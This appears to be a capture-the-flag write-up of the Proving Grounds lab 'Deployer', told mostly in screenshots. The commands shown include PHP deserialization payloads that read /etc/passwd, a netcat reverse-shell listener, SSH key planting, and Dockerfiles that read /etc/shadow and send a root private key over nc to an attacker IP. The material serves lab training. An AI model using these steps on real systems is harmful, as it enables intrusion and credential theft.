---
title: Deployer
date: 2026-05-23T12:00:04+01:00
draft: false
tags:
  - offsec
  - nmap
  - proving-grounds
  - ssh
  - sudo
  - php
  - base64
  - deserialisation
categories:
  - Pentesting
  - Offsec
  - Linux
description: "This guide provides readers with the solution to the Proving Grounds Lab: Deployer"
---
"Some days, I feel like my frustration has its own personality." 
– Ellie Reed

![](Screenshot%202026-05-22%20at%2008.08.58.png)![](Screenshot%202026-05-22%20at%2008.31.24.png)

ftp anonymous@192.168.235.158
password:deployer

![](Screenshot%202026-05-22%20at%2008.32.39.png)

Update your hosts file:  
`sudo vim /etc/hosts`

![](Screenshot%202026-05-22%20at%2009.04.31.png)

![](Screenshot%202026-05-22%20at%2009.04.10.png)

![](Screenshot%202026-05-22%20at%2009.22.03.png)

FTP: All the files I could extract...

![](Screenshot%202026-05-22%20at%2008.32.39.png)

![](Screenshot%202026-05-23%20at%2014.42.52.png)

![](Screenshot%202026-05-23%20at%2015.48.39.png)

update your hosts file... again

![](Screenshot%202026-05-23%20at%2015.52.55.png)

![](Screenshot%202026-05-22%20at%2009.13.03.png)

FTP Upload Ω:

![](Screenshot%202026-05-23%20at%2014.14.11.png)

![](Screenshot%202026-05-23%20at%2014.13.22.png)

`php -r 'class Page { public $file = "/etc/passwd"; } echo serialize(new Page) . "\n";'`

![](Screenshot%202026-05-23%20at%2014.48.33.png)
 
![](Screenshot%202026-05-24%20at%2010.05.02.png)

![](Screenshot%202026-05-22%20at%2017.53.24.png)

`php -r 'class Page { public $file = "/srv/ftp/deployer-shell.php"; } echo serialize(new Page) . "\n";'`

Luckily Caido will encode for us :)

![](Screenshot%202026-05-23%20at%2014.49.36.png)

Annoyingly, I found that anything in the FTP folder will be deleted after one minute. 

![](Screenshot%202026-05-23%20at%2014.19.53.png)

I uploaded the file. ... again

![](Screenshot%202026-05-23%20at%2014.55.25.png)

Start a listener:  
`rlwrap nc -lvnp 1337`

![](Screenshot%202026-05-23%20at%2014.21.33.png)

![](Screenshot%202026-05-22%20at%2017.51.54.png)

Having some issues with the reverse shell, a guide said to create a ssh session. To do this we'll create a ssh key and copy it to the user, shanah's /home/.ssh directory. 


![](Screenshot%202026-05-24%20at%2009.45.58.png)

Kali: 
```
ssh-keygen -t rsa -b 4096 -f /tmp/id_rsa
chmod 600/tmp/id_rsa
```

Victim:
```
cd /home/shanah
mkdir -p .ssh

echo "ssh-rsa AAA...paste your key in instead of this one;....BAAACAQ..." > .ssh/authorized_keys

chmod 600 .ssh/authorized_keys
```

Kali
```
ssh -i /tmp/id_rsa shanah@und3r_dev.developer.off
```

![](Screenshot%202026-05-23%20at%2007.47.48.png)

Once you have the ssh session it becomes very obvious how to escalate privileges^. 

![](Screenshot%202026-05-24%20at%2009.31.04.png)

Create a 'Dockerfile' file:

`vim Dockerfile`

This will create a docker image and execute any command you specify as root....

```
FROM alpine
RUN cat /etc/shadow
```

![](Screenshot%202026-05-24%20at%2009.35.49.png)

```
FROM alpine
RUN chmod u+s /bin/bash
```

![](Screenshot%202026-05-24%20at%2009.32.46.png)

Unfortunately this didn't work...


There was a backup of the id_rsa file in the /opt/ folder, using a docker image, the file can be copied and sent via netcat to a listener. 

```
FROM alpine 
COPY id_rsa.bak /tmp/id_rsa
RUN cat /tmp/id_rsa | nc 192.168.45.166 1234
```

![](Screenshot%202026-05-24%20at%2009.29.17.png)


![](Screenshot%202026-05-24%20at%2009.19.07.png)![](Screenshot%202026-05-24%20at%2009.19.29.png)

`ssh -i id_rsa root@und3r_dev.deployer.off`

![](Screenshot%202026-05-24%20at%2009.20.59.png)

Oops, need to change permissions:
`chmod 600 id_rsa`

![](Screenshot%202026-05-24%20at%2009.20.08.png)